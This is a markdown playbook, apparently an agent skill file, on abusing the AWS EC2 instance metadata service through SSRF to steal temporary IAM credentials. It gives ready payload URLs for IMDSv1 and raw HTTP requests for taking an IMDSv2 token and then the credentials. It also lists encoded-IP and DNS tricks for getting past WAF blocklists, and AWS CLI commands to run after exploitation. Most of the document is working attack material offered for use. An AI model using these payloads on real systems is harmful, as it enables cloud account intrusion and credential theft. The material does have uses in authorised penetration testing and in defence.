---
name: aws_metadata_imds_abuse
description: Advanced exploitation techniques for extracting temporary IAM credentials via AWS Instance Metadata Service (IMDS) using SSRF vulnerabilities, covering both IMDSv1 and IMDSv2.
---

# AWS Instance Metadata Service (IMDS) Abuse

When you encounter an SSRF (Server-Side Request Forgery) vulnerability on an application hosted in an AWS environment, one of your primary objectives should be attempting to extract temporary credentials from the EC2 Instance Metadata Service.

## Conceptual Overview

The AWS IMDS runs locally on EC2 instances and can be accessed at the non-routable link-local IP address: `http://169.254.169.254`. If an application is vulnerable to SSRF, you can force the application server to make a request to this IP.

There are two versions of IMDS:
1.  **IMDSv1:** Request/Response based. Highly vulnerable to standard SSRF since it requires no special headers.
2.  **IMDSv2:** Session-oriented. Requires a `PUT` request to obtain a token, which must then be passed in the `X-aws-ec2-metadata-token` header for subsequent requests.

## Exploiting IMDSv1

If the target allows simple SSRF without header restrictions, try to access IMDSv1:

### 1. Identify IAM Role Names
First, list the IAM roles attached to the instance.

```bash
# Payload to pass to the SSRF parameter
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
If successful, this will return the name of the role (e.g., `web-server-role`).

### 2. Extract Temporary Credentials
Append the retrieved role name to extract the temporary `AccessKeyId`, `SecretAccessKey`, and `Token`.

```bash
# Payload
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}
```

*Note: The returned JSON will contain the credentials which can be directly used locally via `aws configure` (or setting environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`).*

## Exploiting IMDSv2

IMDSv2 is specifically designed to prevent simple SSRF from extracting credentials by requiring a custom header and a token.

### Requirements for IMDSv2 Abuse
You can only exploit IMDSv2 if the SSRF vulnerability allows you to:
1.  **Control the HTTP Method:** Must be able to send a `PUT` request.
2.  **Inject Arbitrary Headers:** Must be able to set the `X-aws-ec2-metadata-token-ttl-seconds` header.
3.  **Read the Response:** Required to extract the token, then use it in a second request.

### Steps to Exploit

1.  **Obtain the Token (PUT Request):**
    ```http
    PUT /latest/api/token HTTP/1.1
    Host: 169.254.169.254
    X-aws-ec2-metadata-token-ttl-seconds: 21600
    ```
    *Extract the token from the response body.*

2.  **Use the Token to Get Role Data (GET Request):**
    ```http
    GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
    Host: 169.254.169.254
    X-aws-ec2-metadata-token: {TOKEN_FROM_PREVIOUS_STEP}
    ```

3.  **Extract Credentials (GET Request):**
    ```http
    GET /latest/meta-data/iam/security-credentials/{ROLE_NAME} HTTP/1.1
    Host: 169.254.169.254
    X-aws-ec2-metadata-token: {TOKEN_FROM_PREVIOUS_STEP}
    ```

## WAF / Filter Evasion Techniques

If `169.254.169.254` is blocked by a blacklist or WAF, you can use various encoding and representation techniques to bypass the filter:

*   **Dotted Hex:** `http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/`
*   **Decimal Endpoint:** `http://2852039166/latest/meta-data/`
*   **Octal Encoding:** `http://0251.0376.0251.0376/latest/meta-data/`
*   **DNS Rebinding/Resolution:** Pointing a domain you control to `169.254.169.254` (e.g., `http://169.254.169.254.nip.io`).
*   **IPv6 equivalent:** `http://[fd00:ec2::254]/latest/meta-data/` (Available on Nitro instances)

## Post-Exploitation

If you successfully extract keys, validate them by running basic discovery commands against the AWS account, such as:
*   `aws sts get-caller-identity` (To verify identity)
*   `aws s3 ls` (Check S3 bucket permissions)
*   `aws ec2 describe-instances --region <target_region>` (Check EC2 enumeration permissions)
